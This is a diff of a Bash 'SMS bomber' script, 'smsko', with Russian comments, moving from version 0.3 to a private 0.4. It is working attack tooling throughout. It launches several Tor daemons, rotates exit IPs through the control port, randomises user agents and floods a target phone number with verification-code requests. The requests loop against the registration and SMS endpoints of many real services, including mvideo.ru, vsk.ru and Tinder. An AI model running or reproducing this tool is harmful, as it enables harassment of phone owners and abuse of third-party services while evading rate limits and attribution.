@@ -1,58 +1,63 @@
 #!/bin/bash
 
-## Name: smsko_0.3
+## Name: smsko_t0.4 #private
 ## Coded by: Nemoize
 
-command -v netcat &>/dev/null || { echo >&2 "Выполните установку netcat."; exit 1; }
-command -v curl &>/dev/null || { echo >&2 "Выполните установку curl."; exit 1; }
-command -v tor &>/dev/null || { echo >&2 "Выполните установку tor."; exit 1; }
+command -v netcat > /dev/null 2>&1 || { echo >&2 "Выполните установку netcat."; exit 1; } # Проверка на утилиты
+command -v curl > /dev/null 2>&1 || { echo >&2 "Выполните установку curl."; exit 1; }
+command -v grep > /dev/null 2>&1 || { echo >&2 "Выполните установку grep."; exit 1; }
+command -v shuf > /dev/null 2>&1 || { echo >&2 "Выполните установку shuf."; exit 1; }
+command -v tor > /dev/null 2>&1 || { echo >&2 "Выполните установку tor."; exit 1; }
+command -v seq > /dev/null 2>&1 || { echo >&2 "Выполните установку seq."; exit 1; }
+command -v wc > /dev/null 2>&1 || { echo >&2 "Выполните установку wc."; exit 1; }
 
-MENU(){
+BANNER(){
     clear
-    echo -e "\e[1;34m .d8888. .88b  d88. .d8888. db   dD  .d88b.  
- 88'  YP 88'YbdP\`88 88'  YP 88 ,8P' .8P  Y8. 
- \`8bo.   88  88  88 \`8bo.   88,8P   88    88 
-   \`Y8b. 88  88  88   \`Y8b. 88\`8b   88    88 
- db   8D 88  88  88 db   8D 88 \`88. \`8b  d8' 
- \`8888Y' YP  YP  YP \`8888Y' YP   YD  \`\e[32mV0.3\e[34m'  
-\e[0m"
+    echo -e "\e[1;34m                   _           _  ___    ___  
+  ___  _____  ___ | |_  ___   / ||   |  | | | 
+ |_ -||     ||_ -|| '_|| . | / / | | | _|_  | 
+ |___||_|_|_||___||_,_||___||_/  |___||_| |_| \e[0m\n"
+}
 
-    if [[ -z $1 || ${#1} -lt 10 || ${#1} -gt 22 ]]; then
+MENU(){ # Проверка аргументов на валидность
+    if [[ -z $1 || ${#1} -lt 10 || ${#1} -gt 22 ]]; then # Сравниваем по длине
         read -p $'\e[1;34m# Номер\e[1;32m: \e[1;37m' arg
-        MENU "${arg//[:punch:|a-z|A-Z|+|\-|(|)| ]}" "$2"
-    elif [[ -z $2 || -n ${2//[0-9]} ]]; then
-        read -p $'\e[1;34m# Время\e[1;32m: \e[1;37m' arg
-        MENU "$1" "${arg:=0}"
+        MENU "${arg//[:punch:|a-z|A-Z|+|\-|(|)| ]}" "$2" "$3" # Обрезаем лишнее если имеется
+    elif [[ -z $2 || -n ${2//[0-9]} || $2 -lt 1 || $2 -gt 10 ]]; then # Проверка на кап
+        read -p $'\e[1;34m# Процессов\e[1;32m: \e[1;37m' arg # При отсутствии деф 5
+        MENU "$1" "${arg:=5}" "$3"
+    elif [[ -z $3 || -n ${3//[0-9]} ]]; then
+        read -p $'\e[1;34m# Время\e[1;32m: \e[1;37m' arg # При отсутствии деф 0
+        MENU "$1" "$2" "${arg:=0}"
     else
-        S_DAEMON "$@"
+        BANNER          # Так как была проверка рекурсией
+        S_DAEMON "$@"   # то передаем все аргументы из MENU дальше
     fi
 }
 
-S_DAEMON(){
+S_DAEMON(){ # Запускаем процессы
     SPID=0
-    [ -d 'tor.tmp' ] || mkdir 'tor.tmp'
-    for i in $(seq 1 5); do
-        ((SP=9050+$i))
-        ((CP=8118+$i))
+    [ -d 'tor.tmp' ] || mkdir 'tor.tmp' # Создаем времянку
+    for i in $(seq 1 $2); do
+        SP=$((9050+$i))  # Генерим порты для ТОР демона
+        CP=$((8118+$i))
         [ -d "tor.tmp/tor_$i" ] || mkdir "tor.tmp/tor_$i"
-        SPID=`ps ax -Ao ppid | grep $$ | wc -l`
-        while [[ $SPID -ge $(($i+1)) ]]; do 
-            SPID=`ps ax -Ao ppid | grep $$ | wc -l`
-            sleep 1
-        done
-        S_BOMB "$@" "$SP" "$CP" "$i" &
+        SPID=$(ps ax -Ao ppid | grep $$ | wc -l) # Получаем ppid процесса
+        while [[ $SPID -ge $(($i+1)) ]]; do SPID=$(ps ax -Ao ppid | grep $$ | wc -l); sleep 2; done # Если процессов мало то...
+        S_BOMB "$1" "$3" "$SP" "$CP" "$i" & # Создаем новый и передаем аргументы
     done
-    while [[ $SPID -gt 1 ]]; do
-        SPID=`ps ax -Ao ppid | grep $$ | wc -l`
-        sleep 1
-    done
+    while [[ $SPID -gt 1 ]]; do SPID=$(ps ax -Ao ppid | grep $$ | wc -l); sleep 1; done
 }
 
-S_BOMB(){
-    tor --ClientOnly 1 --RunAsDaemon 1 --CookieAuthentication 0 --HashedControlPassword "16:129B613CD79CEDC5607AFC1C3656149B6DAF2392EA082DA112FF454D7A" --ControlPort $4 --PidFile tor_$5.pid --SocksPort $3 --DataDirectory tor.tmp/tor_$5 > /dev/null
-    GT=`date +%s`
-    while [[ $(($(date +%s) - GT)) -lt $2 || $2 -eq '0' ]]; do
-        C_TOR "$3" "$4"; G_UA
+S_BOMB(){ # Запускаем в фоне, демона ТОР тоже
+    x=0
+    GT=$(date +%s)
+    # tor --hash-password smsko_private
+    tor --ClientOnly 1 --RunAsDaemon 1 --CookieAuthentication 0 --HashedControlPassword "16:692ADFEBB37586FF607D97FE546AD1E4FC4B0E3BE688D060C8040F98E8" --ControlPort $4 --PidFile tor_$5.pid --SocksPort $3 --DataDirectory tor.tmp/tor_$5 > /dev/null # Запускаем демона с полученными аргументами
+    while [[ $(($(date +%s) - GT)) -lt $2 || $2 -eq '0' ]]; do # Проверяем тайм \ Если 0 то бесконечный цикл
+        C_TOR "$3" "$4" # Чекаем ТОР
+        GET_UA # Рандомный UserAgent
+#################################################################
 curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode?pageName=registerPrivateUserPhoneVerification' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "phone=${1:1:3}-${1:4:7}&g-recaptcha-response&recaptcha=on" -e 'https://www.mvideo.ru/register?sn=false' &>/dev/null & #mvideo.ru
 curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'http://lk.chulpan.ru/Portal/Selfcare/Register/' -H 'Content-Type: application/x-www-form-urlencoded' -d "redirect_type=&redirect_guid=&phone=%2B7+%28${1:1:3}%29+${1:4:3}-${1:7:4}&password=A$(shuf -i 234987-999999 -n 1)z" -e 'http://lk.chulpan.ru/Portal/Selfcare/LogIn' &>/dev/null & #lk.chulpan.ru
 curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://shop.vsk.ru/ajax/auth/postSms/' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "phone=+7+(${1:1:3})+${1:4:3}-${1:7:2}-${1:9:2}" -e 'https://shop.vsk.ru/personal/' &>/dev/null & #vsk.ru
@@ -73,14 +78,15 @@ curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://www.molb
 curl --socks5-hostname localhost:$3 -A "$UA" -b tmp -s "https://www.farpost.ru/sign/confirm?queryParameters%5Breturn%5D=%2F&sessionGeoId=0&return=%2F&sendStatus=notAllowed&sign=$1&entrance=&registration=ok&notsend=1" -H "GET /sign/confirm?queryParameters%5Breturn%5D=%2F&sessionGeoId=0&return=%2F&sendStatus=notAllowed&sign=$1&entrance=&registration=ok&notsend=1 HTTP/1.1" -e 'https://www.farpost.ru/sign?return=%2F' &>/dev/null & #farpost.ru
 curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' -H 'content-type: application/json' -d '{"phone_number":"'$1'"}' -e 'https://tinder.com/' &>/dev/null & #gotinder.com
 curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://agent.prostoy.ru/register/get_sms_code.php' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "<request><mobile>+${1::1}(${1:1:3})${1:4:3}-${1:7:2}-${1:9:2}</mobile></request>" -e 'https://www.prostoy.ru/register' &>/dev/null & #prostoy.ru
-        wait
-        echo -e 'AUTHENTICATE "smsko_0.3"\r\nsignal NEWNYM\r\nQUIT' | nc 127.0.0.1 $4 > /dev/null
-        echo -e " \e[1;34m#\e[0;37m $1\e[1;34m | Время \e[0;37m$(($(date +%s)-GT))\e[0m"
+#################################################################
+        wait # Ожидаем завершения фоновых POST\GET запросов
+        echo -e 'AUTHENTICATE "smsko_private"\r\nsignal NEWNYM\r\nQUIT' | nc 127.0.0.1 $4 > /dev/null # Меняем ip ТОРа
+        echo -e " \e[1;34m#\e[0;37m $1\e[1;34m | Процесс \e[37m$5\t\e[34mЦикл \e[37m$((x++))\t\e[34mВремя \e[0;37m$(($(date +%s)-GT))\e[0m"
     done
 }
 
-G_UA(){
-    case $(shuf -i 1-12 -n 1) in
+GET_UA(){ # Рандомный UserAgent Не жалел на всякий случай
+    case $(shuf -i 1-12 -n 1) in # Великий рандом
     1) UA='Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7';;
     2) UA='Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1';;
     3) UA='Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36';;
@@ -96,14 +102,17 @@ G_UA(){
     esac
 }
 
-C_TOR(){
-    for _ in {1..10}; do
-        curl --max-time 5 --socks5-hostname localhost:$1 -s https://check.torproject.org > /dev/null
-        [ $? -eq 0 ] && break
-        echo -e 'AUTHENTICATE "smsko_0.3"\r\nsignal NEWNYM\r\nQUIT' | nc 127.0.0.1 $2 > /dev/null
+C_TOR(){ # Чекаем коннект ТОРа
+    for _ in {1..10}; do # 10 циклов что бы не выбило при засоре трафика\убогом коннекте
+        curl --max-time 4 --socks5-hostname localhost:$1 -s https://check.torproject.org > /dev/null
+        [ $? -eq 0 ] && break # Выходим если смогли подключиться \ Меняем если 5 секунд мало
+        echo -e 'AUTHENTICATE "smsko_private"\r\nsignal NEWNYM\r\nQUIT' | nc 127.0.0.1 $2 > /dev/null
     done
 }
 
-MENU "${2//[:punch:|a-z|A-Z|+|\-|(|)| ]}" "$1"
-killall tor &>/dev/null
+BANNER
+MENU "${3//[:punch:|a-z|A-Z|+|\-|(|)| ]}" "$1" "$2" # Обрезаем лишнее и передаем в МЕНЮ
+
+killall 'tor' &>/dev/null # Убиваем ТОР
 exit 0
+
